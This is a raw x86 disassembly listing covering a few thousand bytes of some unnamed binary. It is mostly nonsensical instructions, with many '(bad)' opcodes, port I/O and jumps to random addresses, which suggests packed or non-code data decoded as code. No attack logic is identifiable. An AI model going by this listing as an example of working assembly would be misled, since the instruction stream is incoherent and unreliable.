  425b4c:	mov    al,0xd8
  425b4e:	stc    
  425b4f:	iret   
  425b50:	in     al,dx
  425b51:	call   0xc8295d53
  425b56:	lock sti 
  425b58:	ror    BYTE PTR [ecx],0xfa
  425b5b:	out    0x5,eax
  425b5d:	(bad)  
  425b5e:	psubusb mm4,mm0
  425b61:	fdivr  QWORD PTR [edx+ebp*4-0x193e4144]
  425b68:	call   0xdf104f4f
  425b6d:	iret   
  425b6e:	mov    esi,0xe9beceec
  425b73:	idiv   esp
  425b75:	ret    
  425b76:	in     eax,dx
  425b77:	not    ecx
  425b79:	fucom  st(4)
  425b7b:	in     eax,0xc5
  425b7d:	in     eax,dx
  425b7e:	jecxz  0x425b4e
  425b80:	rcl    ebx,cl
  425b82:	(bad)  
  425b83:	jmp    0x425b48
  425b85:	loopne 0x425b37
  425b87:	repz ret 
  425b89:	sar    BYTE PTR [ecx-0x322a0620],cl
  425b8f:	call   0xce1e5a5e
  425b94:	mov    ebp,0x4dbecee
  425b99:	rol    BYTE PTR [ebx],cl
  425b9b:	add    al,0xf5
  425b9d:	(bad)  
  425b9e:	in     eax,0xe
  425ba0:	fsub   st,st(6)
  425ba2:	in     al,dx
  425ba3:	ret    
  425ba4:	leave  
  425ba5:	mov    cl,0xf5
  425ba7:	repnz icebp 
  425ba9:	shl    BYTE PTR [ebp-0x2f363a08],cl
  425baf:	dec    esi
  425bb1:	in     al,dx
  425bb2:	out    dx,eax
  425bb3:	rcr    eax,0xbd
  425bb6:	hlt    
  425bb7:	in     al,dx
  425bb8:	(bad)  
  425bb9:	mov    esp,0xe8f5fb03
  425bbe:	out    0xe2,al
  425bc0:	push   es
  425bc1:	pop    es
  425bc2:	test   eax,0xb6e9f2cc
  425bc7:	enter  0xe7f2,0xfa
  425bcb:	out    dx,al
  425bcc:	fbstp  TBYTE PTR [ebp+esi*8-0x400f4b12]
  425bd3:	clc    
  425bd4:	test   bl,0xbb
  425bd7:	(bad)  
  425bd8:	or     ecx,DWORD PTR [ebx]
  425bda:	call   0x103065e8
  425bdf:	ret    0xcf0b
  425be2:	faddp  st(7),st
  425be4:	out    0xd5,al
  425be6:	int    0xd1
  425be8:	lods   al,BYTE PTR ds:[esi]
  425be9:	repz neg edi
  425bec:	mov    ecx,0xfbf6e4d8
  425bf1:	mov    edi,0xddb5baf7
  425bf6:	hlt    
  425bf7:	stc    
  425bf8:	or     ah,cl
  425bfa:	ret    0xded8
  425bfd:	(bad)  
  425bfe:	out    0xb,eax
  425c00:	retf   0xe3dd
  425c03:	jecxz  0x425bd6
  425c05:	(bad)
  425c08:	loopne 0x425bf8
  425c0a:	ror    dl,0xea
  425c0d:	mov    eax,0xefd5c8cc
  425c12:	repz int 0xd6
  425c15:	cmc    
  425c16:	ret    
  425c17:	(bad)  
  425c19:	clc    
  425c1a:	sti    
  425c1b:	shr    dl,1
  425c1d:	test   ch,0xc
  425c20:	fucomp st(1)
  425c22:	mov    esp,0xb5b2e9e5
  425c27:	retf   
  425c28:	shr    eax,cl
  425c2a:	(bad)  
  425c2b:	icebp  
  425c2c:	repnz retf 
  425c2e:	(bad)  
  425c2f:	out    dx,al
  425c30:	cmc    
  425c31:	out    dx,eax
  425c32:	loopne 0x425c09
  425c34:	add    ebp,esp
  425c36:	mov    esp,0xfff2d7d1
  425c3b:	(bad)  
  425c3d:	push   es
  425c3e:	jmp    0xeb1b544d
  425c43:	mov    esp,0xc9f0f7d3
  425c48:	mov    bh,0xa8
  425c4a:	jmp    0x425c21
  425c4c:	(bad)  
  425c4d:	mov    eax,0xf3feecd8
  425c52:	int3   
  425c53:	repz repz add ch,cl
  425c57:	in     eax,0xe0
  425c59:	hlt    
  425c5a:	stc    
  425c5b:	rcr    eax,0xff
  425c5e:	(bad)
  425c61:	loop   0x425c29
  425c63:	in     eax,dx
  425c64:	leave  
  425c65:	into   
  425c66:	mov    bl,0xe7
  425c68:	(bad)  
  425c69:	lods   al,BYTE PTR ds:[esi]
  425c6a:	int    0xf2
  425c6c:	hlt    
  425c6d:	ftst   
  425c6f:	in     al,0xc3
  425c71:	mov    edi,0xe2d9c3e9
  425c76:	mov    esi,0xf1c00afc
  425c7b:	(bad)  
  425c7d:	jmp    0xe4e5:0xfcf8dc0f
  425c84:	mul    esp
  425c86:	mov    dl,0xf2
  425c88:	(bad)
  425c8b:	loopne 0x425c73
  425c8d:	mov    ebx,0xf2ddd8ed
  425c92:	aam    0xfa
  425c94:	iret   
  425c95:	loopne 0x425c88
  425c97:	mov    ebp,0xdae807b9
  425c9c:	sti    
  425c9d:	or     eax,0x2c8f804
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    cl,0xb3
  425ca5:	out    0xc2,al
  425ca7:	not    dh
  425ca9:	mov    cl,0xd9
  425cab:	mov    eax,0xd2ecebfb
  425cb0:	mov    esi,0xcdece0f7
  425cb5:	fadd   st(6),st
  425cb7:	(bad)  
  425cb8:	mov    esp,0xc5da09f7
  425cbd:	fcmovne st,st(6)
  425cbf:	jmp    0x425ca6
  425cc1:	(bad)  
  425cc3:	repz fidivr WORD PTR [ebp-0x320c1a2c]
  425cca:	scas   eax,DWORD PTR es:[edi]
  425ccb:	lock aad 0xfd
  425cce:	out    dx,al
  425ccf:	fmul   st,st(7)
  425cd1:	fsubr  st,st(6)
  425cd3:	fistp  QWORD PTR [ecx-0x2aff012a]
  425cd9:	jmp    0x425ca4
  425cdb:	ret    0xe1c9
  425cde:	retf   0xe804
  425ce1:	jecxz  0x425cc9
  425ce3:	lods   eax,DWORD PTR ds:[esi]
  425ce4:	(bad)  
  425ce5:	loopne 0x425cd1
  425ce7:	shl    edi,cl
  425ce9:	jmp    0x425cb5
  425ceb:	mov    dl,0xcd
  425ced:	fxch   st(5)
  425cef:	hlt    
  425cf0:	icebp  
  425cf1:	fadd   QWORD PTR [ebx]
  425cf3:	ror    dh,0xc0
  425cf6:	out    0xde,eax
  425cf8:	repnz hlt 
  425cfa:	sar    ecx,0xdb
  425cfd:	out    dx,eax
  425cfe:	or     dl,ah
  425d00:	loopne 0x425cd0
  425d02:	retf   
  425d03:	icebp  
  425d04:	in     al,dx
  425d05:	ret    
  425d06:	out    0xad,al
  425d08:	enter  0xc9c7,0xf9
  425d0c:	in     al,dx
  425d0d:	mov    esi,0xdbdbcfbb
  425d12:	aad    0xfe
  425d14:	int3   
  425d15:	fsub   st,st(7)
  425d17:	loope  0x425cde
  425d19:	icebp  
  425d1a:	or     al,dh
  425d1c:	jmp    0xaaf2:0xe7fae1cf
  425d23:	shl    esi,0xbe
  425d26:	mov    ch,0xf6
  425d28:	lods   eax,DWORD PTR ds:[esi]
  425d29:	out    dx,al
  425d2a:	mov    bh,0xc5
  425d2c:	cmc    
  425d2d:	std    
  425d2e:	cli    
  425d2f:	(bad)  
  425d31:	repnz fdivr st,st(3)
  425d34:	add    dh,ah
  425d36:	in     al,dx
  425d37:	in     eax,0xbd
  425d39:	clc    
  425d3a:	ret    
  425d3b:	cmc    
  425d3c:	out    dx,al
  425d3d:	stc    
  425d3e:	leave  
  425d3f:	(bad)  
  425d40:	iret   
  425d41:	into   
  425d42:	mov    esi,0xc6c2e5bf
  425d47:	out    0xfb,al
  425d49:	loop   0x425d3f
  425d4b:	ror    dl,1
  425d4d:	mov    ah,0xfc
  425d4f:	div    DWORD PTR [ebp+ebx*8-0x20fd1723]
  425d56:	shl    ah,0xea
  425d59:	sar    DWORD PTR [edi-0x143bfe1d],1
  425d5f:	cld    
  425d60:	cld    
  425d61:	fmul   st(1),st
  425d63:	ret    0xdecc
  425d66:	(bad)  
  425d67:	mov    ah,0xad
  425d69:	aad    0xb0
  425d6b:	mov    cl,0xff
  425d6d:	iret   
  425d6e:	icebp  
  425d6f:	fucom  st(2)
  425d71:	fbstp  TBYTE PTR [edi+0x501d5fe]
  425d77:	push   es
  425d78:	(bad)  
  425d79:	fsub   st,st(5)
  425d7b:	mov    esi,0xe3e3d6e4
  425d80:	push   es
  425d81:	leave  
  425d82:	scas   eax,DWORD PTR es:[edi]
  425d83:	scas   eax,DWORD PTR es:[edi]
  425d84:	retf   0xe0a4
  425d87:	mov    dh,0xd6
  425d89:	mov    dl,0xfb
  425d8b:	into   
  425d8c:	jmp    0x425d45
  425d8e:	icebp  
  425d8f:	rcl    esp,1
  425d91:	hlt    
  425d92:	sar    DWORD PTR [esi-0xb2b3d08],1
  425d98:	or     edi,eax
  425d9a:	ret    0x7df
  425d9d:	(bad)  
  425d9e:	out    dx,al
  425d9f:	in     eax,dx
  425da0:	adc    cl,BYTE PTR [ecx]
  425da2:	jmp    0x425d6e
  425da4:	int3   
  425da5:	jmp    0x425d94
  425da7:	div    bl
  425da9:	out    0xf6,eax
  425dab:	into   
  425dac:	shr    ebx,1
  425dae:	out    dx,al
  425daf:	fcmovne st,st(6)
  425db1:	ret    0xfedd
  425db4:	xlat   BYTE PTR ds:[ebx]
  425db5:	xlat   BYTE PTR ds:[ebx]
  425db6:	push   es
  425db7:	in     al,0xc1
  425db9:	mov    esp,0xcfe8e4e5
  425dbe:	(bad)  
  425dc0:	ror    esi,cl
  425dc2:	rcr    dh,0xcb
  425dc5:	fucom  st(6)
  425dc7:	cmc    
  425dc8:	test   dl,0xd9
  425dcb:	out    0xd6,al
  425dcd:	in     al,dx
  425dce:	retf   0xcdbf
  425dd1:	repz int 0xcf
  425dd4:	add    ecx,edi
  425dd6:	int3   
  425dd7:	out    0xe7,eax
  425dd9:	in     eax,0xf1
  425ddb:	aam    0xe9
  425ddd:	jmp    0xa351fea
  425de2:	fsubr  DWORD PTR [esi-0x51363f32]
  425de8:	fucomi st,st(1)
  425dea:	mov    ecx,0xf6dbb9ee
  425def:	std    
  425df0:	repz jmp 0xc0e0:0x3e6eef4
  425df8:	lock rol BYTE PTR ds:0xeb0bd8c7,0xc5
  425e00:	call   0xeb011de5
  425e05:	enter  0xc6c9,0xfa
  425e09:	mul    ecx
  425e0b:	cli    
  425e0c:	retf   
  425e0d:	(bad)  
  425e0e:	sar    ebp,cl
  425e10:	std    
  425e11:	mov    ebp,0xfff0fef9
  425e16:	fild   WORD PTR [esi]
  425e18:	icebp  
  425e19:	std    
  425e1a:	add    al,0xf8
  425e1c:	fstp   st(2)
  425e1e:	(bad)
  425e21:	loop   0x425e15
  425e23:	scas   eax,DWORD PTR es:[edi]
  425e24:	fsubp  st(1),st
  425e26:	cmc    
  425e27:	mov    cl,0xf4
  425e29:	mov    dh,0xc9
  425e2b:	into   
  425e2c:	in     eax,0xb7
  425e2e:	fcom   st(4)
  425e30:	add    bh,BYTE PTR [eax+edi*8+0x2c1e107]
  425e37:	aad    0xd7
  425e39:	in     eax,0xea
  425e3b:	xlat   BYTE PTR ds:[ebx]
  425e3c:	(bad)  
  425e3d:	out    0xe8,eax
  425e3f:	add    al,0xc8
  425e41:	fucom  st(7)
  425e43:	icebp  
  425e44:	test   eax,0xc2f1cee1
  425e49:	mov    ebx,0xd7d8e9f5
  425e4e:	leave  
  425e4f:	in     eax,dx
  425e50:	fiadd  DWORD PTR [edx]
  425e52:	out    dx,al
  425e53:	jecxz  0x425e26
  425e55:	jecxz  0x425e59
  425e57:	cmc    
  425e58:	sar    DWORD PTR [eax-0x31f5092b],1
  425e5e:	add    bl,ah
  425e60:	repnz iret 
  425e62:	into   
  425e63:	in     al,0xaf
  425e65:	call   0xfa262b53
  425e6a:	shl    esp,1
  425e6c:	lods   eax,DWORD PTR ds:[esi]
  425e6d:	clc    
  425e6e:	(bad)  
  425e6f:	fdiv   st,st(5)
  425e71:	(bad)  
  425e72:	fucomip st,st(6)
  425e74:	fiadd  DWORD PTR [edx]
  425e76:	loop   0x425e5d
  425e78:	rol    ebx,cl
  425e7a:	ret    0xc4cb
  425e7d:	dec    DWORD PTR [eax]
  425e7f:	retf   
  425e80:	fsubrp st(1),st
  425e82:	scas   al,BYTE PTR es:[edi]
  425e83:	xlat   BYTE PTR ds:[ebx]
  425e84:	out    0xe9,al
  425e86:	mov    dl,0xc9
  425e88:	in     al,0xcc
  425e8a:	iret   
  425e8b:	fsubr  st,st(7)
  425e8d:	in     al,0xcc
  425e8f:	int    0xbf
  425e91:	ret    0xdabb
  425e94:	xlat   BYTE PTR ds:[ebx]
  425e95:	jecxz  0x425e79
  425e97:	add    eax,0xdf02d7f4
  425e9c:	jmp    0xea256cac
  425ea1:	add    BYTE PTR [ebp-0xb350c28],bh
  425ea7:	mov    ch,0xe5
  425ea9:	ror    edi,cl
  425eab:	int    0xbb
  425ead:	in     al,dx
  425eae:	fstp   TBYTE PTR [esi+0x301c2cf]
  425eb4:	mov    edi,0xf6e6f6f2
  425eb9:	idiv   esp
  425ebb:	xlat   BYTE PTR ds:[ebx]
  425ebc:	sti    
  425ebd:	push   cs
  425ebe:	or     al,dl
  425ec0:	or     al,al
  425ec2:	in     al,dx
  425ec3:	stos   BYTE PTR es:[edi],al
  425ec4:	out    dx,eax
  425ec5:	jecxz  0x425e94
  425ec7:	div    DWORD PTR [edi-0x2418291b]
  425ecd:	dec    ch
  425ecf:	fdivr  st,st(2)
  425ed1:	mov    al,0xe9
  425ed3:	mov    esp,0xdeedfbf7
  425ed8:	inc    edx
  425eda:	or     edx,edi
  425edc:	add    ebx,ebx
  425ede:	add    eax,0xaae3f8e0
  425ee3:	loopne 0x425ea3
  425ee5:	not    ebx
  425ee7:	fdiv   QWORD PTR [edx-0x45360406]
  425eed:	into   
  425eee:	mov    ebp,0xdcd1d6b8
  425ef3:	loop   0x425ec6
  425ef5:	int    0xc3
  425ef7:	fnclex 
  425ef9:	retf   0xc2e1
  425efc:	fild   WORD PTR [ebx]
  425efe:	add    esp,ebx
  425f00:	ffreep st(0)
  425f02:	stos   DWORD PTR es:[edi],eax
  425f03:	mov    esi,0xe1e5cff3
  425f08:	shr    al,0xe7
  425f0b:	(bad)  
  425f0c:	sar    bl,cl
  425f0e:	in     eax,dx
  425f0f:	in     al,0xf4
  425f11:	add    cl,bh
  425f13:	call   0xd13f46e8
  425f18:	jmp    0x425f1b
  425f1a:	call   0xde4c6318
  425f1f:	jmp    0x425f14
  425f21:	faddp  st(5),st
  425f23:	int3   
  425f24:	mov    cl,0xc3
  425f26:	jmp    0xfece:0xeee2ace5
  425f2d:	mov    dh,0xd3
  425f2f:	jmp    0xc3373716
  425f34:	xlat   BYTE PTR ds:[ebx]
  425f35:	in     eax,dx
  425f36:	(bad)  
  425f37:	(bad)  
  425f38:	repnz icebp 
  425f3a:	icebp  
  425f3b:	in     eax,0x4
  425f3d:	jmp    0x8304905
  425f42:	fincstp 
  425f44:	div    cl
  425f46:	out    0xaa,al
  425f48:	jecxz  0x425f14
  425f4a:	out    dx,al
  425f4b:	out    dx,al
  425f4c:	in     al,0xd6
  425f4e:	mov    bl,0xcb
  425f50:	clc    
  425f51:	(bad)  
  425f52:	fsubr  st,st(5)
  425f54:	int3   
  425f55:	fcomi  st,st(7)
  425f57:	out    0xf8,eax
  425f59:	jecxz  0x425f63
  425f5b:	or     ecx,ecx
  425f5d:	std    
  425f5e:	ffree  st(5)
  425f60:	fdiv   st(4),st
  425f62:	ret    0xcbeb
  425f65:	test   al,0xf4
  425f67:	ret    
  425f68:	retf   0xc4f7
  425f6b:	jmp    0xd5bb:0xd5bbe4fe
  425f72:	(bad)  
  425f74:	aad    0xb4
  425f76:	loop   0x425f74
  425f78:	retf   
  425f79:	cmc    
  425f7a:	mov    BYTE PTR [edx],0xc6
  425f7d:	fisttp WORD PTR ds:0xededddef
  425f83:	in     al,0xf3
  425f85:	in     al,dx
  425f86:	jmp    0x425f6b
  425f88:	int    0xf2
  425f8a:	(bad)  
  425f8b:	fucomip st,st(0)
  425f8d:	(bad)  
  425f8f:	fsub   st,st(3)
  425f91:	clc    
  425f92:	add    edx,edx
  425f94:	cli    
  425f95:	ret    
  425f96:	std    
  425f97:	ret    0xd2f1
  425f9a:	ror    DWORD PTR [ebx],0xcf
  425f9d:	aam    0xd9
  425f9f:	or     al,0xf3
  425fa1:	add    eax,0xd3eab2bf
  425fa6:	aad    0xfb
  425fa8:	mov    ebx,0xf7fbcab2
  425fad:	sti    
  425fae:	in     eax,dx
  425faf:	out    dx,eax
  425fb0:	retf   0xd1bf
  425fb3:	add    al,dl
  425fb5:	add    edx,esp
  425fb7:	fchs   
  425fb9:	push   es
  425fba:	add    al,0xc6
  425fbc:	pop    es
  425fbd:	out    0x2,al
  425fbf:	fdivp  st(3),st
  425fc1:	loop   0x425f70
  425fc3:	imul   DWORD PTR [eax-0x2e0d1e16]
  425fc9:	repz enter 0xcdc8,0xac
  425fce:	in     al,dx
  425fcf:	cli    
  425fd0:	mov    esi,0xfccd02d0
  425fd5:	shr    esp,1
  425fd7:	loop   0x425fbd
  425fd9:	add    eax,esp
  425fdb:	test   BYTE PTR [ecx],0xc7
  425fde:	or     ecx,ebp
  425fe0:	dec    cl
  425fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe3:	iret   
  425fe4:	(bad)  
  425fe5:	shl    al,cl
  425fe7:	loope  0x425fd2
  425fe9:	(bad)  
  425fea:	(bad)  
  425feb:	mov    edx,0xdbfbbbf4
  425ff0:	mov    ebx,0xfcf4baed
  425ff5:	out    0xdd,al
  425ff7:	push   es
  425ff8:	loopne 0x425fbb
  425ffa:	fucom  st(7)
  425ffc:	out    dx,al
  425ffd:	add    esp,eax
  425fff:	int    0xcc
  426001:	int3   
  426002:	in     al,0xec
  426004:	(bad)
  426007:	into   
  426008:	ret    0xd9e1
  42600b:	(bad)  
  42600c:	(bad)  
  42600e:	jmp    0xdf2418e6
  426013:	inc    BYTE PTR [ecx]
  426015:	ret    0xe6e5
  426018:	loopne 0x42601d
  42601a:	shl    bh,0xe4
  42601d:	ror    dl,0xe1
  426020:	or     al,0x5
  426022:	out    dx,al
  426023:	int3   
  426024:	mov    bh,0xe0
  426026:	loope  0x42600e
  426028:	in     eax,dx
  426029:	lock out 0xb1,eax
  42602c:	fmulp  st(3),st
  42602e:	repz mov dl,0xfb
  426031:	loop   0x425fff
  426033:	(bad)  
  426035:	ret    
  426036:	add    eax,esi
  426038:	fistp  QWORD PTR [eax-0x2219041b]
  42603e:	or     al,0x9
  426040:	in     al,0xc0
  426042:	jecxz  0x426013
  426044:	ret    0xebcf
  426047:	repnz loopne 0x42601d
  42604a:	in     eax,dx
  42604b:	(bad)  
  42604d:	aad    0xcb
  42604f:	xlat   BYTE PTR ds:[ebx]
  426050:	fmul   st,st(0)
  426052:	mov    ecx,0xedbebec0
  426057:	sar    ah,cl
  426059:	loope  0x42605b
  42605b:	out    0x5,eax
  42605d:	or     ebp,edi
  42605f:	or     al,0x7
  426061:	add    al,0xc9
  426063:	loopne 0x42602f
  426065:	imul   BYTE PTR [esi-0xf180d0d]
  42606b:	(bad)  
  42606c:	imul   esi
  42606e:	jmp    0xceee:0xd1fcf9ec
  426075:	add    edx,ebp
  426077:	fcmovu st,st(4)
  426079:	jmp    0x426079
  42607b:	retf   0xd8da
  42607e:	cli    
  42607f:	iret   
  426080:	repz repnz leave 
  426083:	out    0xc6,al
  426085:	in     al,dx
  426086:	out    dx,eax
  426087:	lods   al,BYTE PTR ds:[esi]
  426088:	iret   
  426089:	repnz mov dh,0xf8
  42608d:	fnsave [ecx+ecx*8-0x3ffd1d30]
  426094:	mov    esp,0xd2dadac0
  426099:	out    0xd6,eax
  42609b:	fdivr  st,st(5)
  42609d:	add    al,BYTE PTR [eax]
  42609f:	repz (bad) 
  4260a1:	fucomp st(3)
  4260a3:	retf   
  4260a4:	lods   al,BYTE PTR ds:[esi]
  4260a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260a6:	mov    dh,0xc3
  4260a8:	ret    0xd4e9
  4260ab:	mov    cl,0xdf
  4260ad:	repz into 
  4260af:	not    ebp
  4260b1:	loop   0x4260a1
  4260b3:	add    eax,eax
  4260b5:	out    dx,al
  4260b6:	loope  0x426094
  4260b8:	sti    
  4260b9:	mov    eax,0xcbfcc105
  4260be:	push   cs
  4260bf:	jmp    0xbdf3:0xcdc3e713
  4260c6:	mov    ebp,0xdacdf2f7
  4260cb:	repz div BYTE PTR [edi-0x3047230a]
  4260d2:	not    dh
  4260d4:	fadd   st,st(6)
  4260d6:	test   esp,0xf5c3fb06
  4260dc:	aam    0xc0
  4260de:	into   
  4260df:	push   cs
  4260e0:	or     ch,ch
  4260e2:	enter  0xc3d0,0xf0
  4260e6:	jmp    0xedf75898
  4260eb:	cmc    
  4260ec:	mov    edx,0xf4eef9f8
  4260f1:	int3   
  4260f2:	xlat   BYTE PTR ds:[ebx]
  4260f3:	pop    es
  4260f4:	idiv   BYTE PTR [esi+0xad9dbf1]
  4260fa:	jecxz  0x4260d1
  4260fc:	push   cs
  4260fd:	pxor   mm1,QWORD PTR ds:0xacccce0f
  426104:	retf   0xeded
  426107:	out    0xd1,eax
  426109:	out    0xf3,al
  42610b:	iret   
  42610c:	mov    ch,0xcf
  42610e:	(bad)  
  42610f:	sar    dh,cl
  426111:	clc    
  426112:	rcl    edi,0xcf
  426115:	ffree  st(6)
  426117:	add    eax,0xd8e1c6
  42611c:	in     al,0xc5
  42611e:	std    
  42611f:	std    
  426120:	into   
  426121:	or     eax,0xdcf1b1f3
  426126:	lock shl cl,0xb2
  42612a:	retf   0xd0b2
  42612d:	fst    st(5)
  42612f:	int    0xd0
  426131:	(bad)  
  426133:	fcmovb st,st(7)
  426135:	add    al,BYTE PTR [eax]
  426137:	aam    0xc2
  426139:	fstp   st(1)
  42613b:	loopne 0x42612b
  42613d:	aam    0xc8
  42613f:	adc    ecx,esi
  426141:	add    eax,0xedf6e1ae
  426146:	out    dx,eax
  426147:	mul    ebx
  426149:	stc    
  42614a:	int3   
  42614b:	cmc    
  42614c:	(bad)  
  42614d:	mov    dh,0xbf
  42614f:	cli    
  426150:	rcr    esi,1
  426152:	mov    edi,0xf103e3c0
  426157:	rcl    ebp,1
  426159:	or     esp,ebp
  42615b:	jmp    esi
  42615d:	or     ecx,DWORD PTR [edx]
  42615f:	(bad)  
  426161:	pop    es
  426162:	in     eax,0xa8
  426164:	mov    dl,0xf3
  426166:	mov    dh,0xed
  426168:	repnz fcmovbe st,st(3)
  42616b:	out    0xe5,al
  42616d:	xlat   BYTE PTR ds:[ebx]
  42616e:	mov    dh,0xdf
  426170:	fdiv   st(3),st
  426172:	cmc    
  426173:	clc    
  426174:	add    dl,ah
  426176:	loopne 0x42613b
  426178:	hlt    
  426179:	lds    eax,FWORD PTR [ecx]
  42617b:	or     edi,edx
  42617d:	fsubr  st(5),st
  42617f:	aam    0x1
  426181:	retf   0xebec
  426184:	ror    eax,cl
  426186:	shr    ecx,cl
  426188:	mov    ebx,0xd1cdf4e2
  42618d:	shl    cl,1
  42618f:	icebp  
  426190:	jecxz  0x426174
  426192:	ret    0xe2f7
  426195:	mov    ebp,0xd9f7d7f0
  42619a:	out    0x1,eax
  42619c:	(bad)  
  42619e:	add    edi,edx
  4261a0:	jmp    0xeff3:0xece1f204
  4261a7:	out    dx,al
  4261a8:	in     al,dx
  4261a9:	aad    0xbb
  4261ab:	out    dx,al
  4261ac:	fcmovnbe st,st(0)
  4261ae:	mov    bl,0xf5
  4261b0:	loop   0x426181
  4261b2:	not    esp
  4261b4:	out    dx,al
  4261b5:	hlt    
  4261b6:	(bad)  
  4261b7:	aam    0xda
  4261b9:	fimul  WORD PTR [ebx]
  4261bb:	add    eax,0x4dacaf6
  4261c0:	out    0xe1,al
  4261c2:	mov    esi,0xc9d1dff2
  4261c7:	out    0xef,eax
  4261c9:	enter  0xd8e5,0xf8
  4261cd:	out    dx,al
  4261ce:	mov    edx,0xd5befffb
  4261d3:	repnz out dx,al
  4261d5:	sar    dl,0xc6
  4261d8:	sti    
  4261d9:	hlt    
  4261da:	hlt    
  4261db:	(bad)  
  4261dc:	std    
  4261dd:	fdivrp st(4),st
  4261df:	aam    0xed
  4261e1:	or     eax,0xe3bebccd
  4261e6:	loop   0x4261d0
  4261e8:	mov    bl,0xf9
  4261ea:	mov    ebx,0xe9ddcee0
  4261ef:	mov    ebp,0xf7f5e3f1
  4261f4:	(bad)  
  4261f6:	mov    esp,0xc6e0e4de
  4261fb:	ror    BYTE PTR [edx],1
  4261fd:	or     ch,dh
  4261ff:	int    0xdd
  426201:	int3   
  426202:	in     eax,dx
  426203:	div    DWORD PTR [edi-0xf2a152d]
  426209:	aad    0xf6
  42620b:	enter  0xf7d8,0xea
  42620f:	int    0xd4
  426211:	shl    cl,cl
  426213:	push   esi
  426215:	aam    0xe0
  426217:	xlat   BYTE PTR ds:[ebx]
  426218:	out    0xf8,al
  42621a:	leave  
  42621b:	sar    esi,0xc0
  42621e:	hlt    
  42621f:	add    al,0xd8
  426221:	add    al,0xe5
  426223:	shr    BYTE PTR [ebp-0x343c2c1f],0xd3
  42622a:	int    0xb4
  42622c:	aad    0xcd
  42622e:	(bad)  
  42622f:	jmp    0xdada:0xe7feb002
  426236:	aad    0x3
  426238:	push   es
  426239:	jecxz  0x426205
  42623b:	ret    0xfdc6
  42623e:	jecxz  0x42624f
  426240:	cld    
  426241:	jmp    0x4261fb
  426243:	leave  
  426244:	(bad)  
  426245:	retf   
  426246:	leave  
  426247:	out    dx,al
  426248:	out    0xf0,eax
  42624a:	(bad)  
  42624c:	lds    edi,FWORD PTR [eax-0xb213137]
  426252:	call   0xbf415846
  426257:	loopne 0x426263
  426259:	jmp    0x1f8:0xd9c7e9e1
  426260:	adc    edi,ebp
  426262:	les    ebp,FWORD PTR [edx-0x43511b3d]
  426268:	enter  0xfada,0xef
  42626c:	stc    
  42626d:	jmp    0xf7062b61
  426272:	clc    
  426273:	mov    ecx,0xe604bdee
  426278:	repz aam 0xd6
  42627b:	loop   0x42623a
  42627d:	out    0xde,eax
  42627f:	fadd   st,st(4)
  426281:	or     esi,DWORD PTR [ecx-0x39333752]
  426287:	into   
  426288:	cli    
  426289:	shl    esi,cl
  42628b:	(bad)  
  42628d:	jmp    0x426263
  42628f:	into   
  426290:	repnz fcmovnbe st,st(2)
  426293:	ffreep st(7)
  426295:	pop    es
  426296:	loop   0x42626c
  426298:	aam    0xf7
  42629a:	aad    0xe2
  42629c:	aad    0xee
  42629e:	iret   
  42629f:	into   
  4262a0:	jmp    0xad233ca1
  4262a5:	loope  0x426252
  4262a7:	mov    al,0xd3
  4262a9:	cli    
  4262aa:	retf   
  4262ab:	out    0xcb,al
  4262ad:	leave  
  4262ae:	idiv   edx
  4262b0:	int3   
  4262b1:	fiadd  WORD PTR [edx]
  4262b3:	cli    
  4262b4:	(bad)  
  4262b6:	(bad)  
  4262b7:	shl    ah,cl
  4262b9:	or     bl,bl
  4262bb:	pop    es
  4262bc:	clc    
  4262bd:	or     dh,ch
  4262bf:	in     al,0xe0
  4262c1:	fsub   st,st(3)
  4262c3:	in     eax,dx
  4262c4:	ret    0xacc3
  4262c7:	rol    al,1
  4262c9:	test   al,0xd3
  4262cb:	aad    0xad
  4262cd:	neg    edi
  4262cf:	icebp  
  4262d0:	mov    esp,0x1d7c3c9
  4262d5:	mov    eax,0xfbc0f7be
  4262da:	loope  0x4262b3
  4262dc:	xlat   BYTE PTR ds:[ebx]
  4262dd:	(bad)  
  4262de:	loopne 0x4262c9
  4262e0:	loopne 0x4262db
  4262e2:	lods   al,BYTE PTR ds:[esi]
  4262e3:	mov    al,0xa9
  4262e5:	int    0xad
  4262e7:	in     al,dx
  4262e8:	(bad)  
  4262e9:	mov    bh,0xf3
  4262eb:	(bad)  
  4262ec:	out    dx,al
  4262ed:	in     eax,dx
  4262ee:	lock mov ebp,0xe7d4c9bc
  4262f4:	rcr    bh,0xf8
  4262f7:	add    eax,0xd8e8d504
  4262fc:	add    ecx,ebx
  4262fe:	aam    0x0
  426300:	or     ah,bl
  426302:	icebp  
  426303:	repz leave 
  426305:	rcl    bl,0xe8
  426308:	(bad)  
  426309:	shr    bl,cl
  42630b:	cli    
  42630c:	into   
  42630d:	(bad)  
  42630e:	jmp    0xe1bd:0xb9f9d8f7
  426315:	pop    es
  426316:	fcomip st,st(4)
  426318:	or     esi,esp
  42631a:	loop   0x426310
  42631c:	pop    es
  42631d:	(bad)  
  42631e:	in     eax,dx
  42631f:	clc    
  426320:	cli    
  426321:	(bad)  [ebx-0x29535a12]
  426327:	jmp    0xfc081ae0
  42632c:	shl    esp,cl
  42632e:	xlat   BYTE PTR ds:[ebx]
  42632f:	lock icebp 
  426331:	inc    BYTE PTR [eax]
  426333:	std    
  426334:	loope  0x426335
  426336:	(bad)  
  426338:	mov    DWORD PTR [eax],0xfdee02ff
  42633e:	loopne 0x426338
  426340:	in     al,dx
  426341:	retf   0xe0eb
  426344:	out    0xd7,eax
  426346:	out    0xe2,eax
  426348:	idiv   DWORD PTR [ebx-0x260c1334]
  42634e:	rcr    dh,1
  426350:	ret    
  426351:	idiv   esp
  426353:	add    edx,ebp
  426355:	(bad)  
  426357:	fiadd  DWORD PTR [ebx+ebp*8]
  42635a:	(bad)  
  42635b:	jmp    0xce382761
  426360:	in     eax,dx
  426361:	in     eax,0xc0
  426363:	out    0xbe,al
  426365:	icebp  
  426366:	jmp    0xd5cd:0xd8c6c8e7
  42636d:	sar    DWORD PTR [ebx-0xb114a36],1
  426373:	int3   
  426374:	loope  0x42633c
  426376:	loope  0x42635e
  426378:	rcr    dl,1
  42637a:	mov    DWORD PTR [edx],0xcee0c5d5
  426380:	repnz add ch,BYTE PTR [edx-0x1a392f18]
  426387:	aad    0xc1
  426389:	mov    dl,0xb6
  42638b:	mov    ch,0xd5
  42638d:	jmp    0x426364
  42638f:	sar    BYTE PTR [edx-0x1d372503],1
  426395:	hlt    
  426396:	loopne 0x42638e
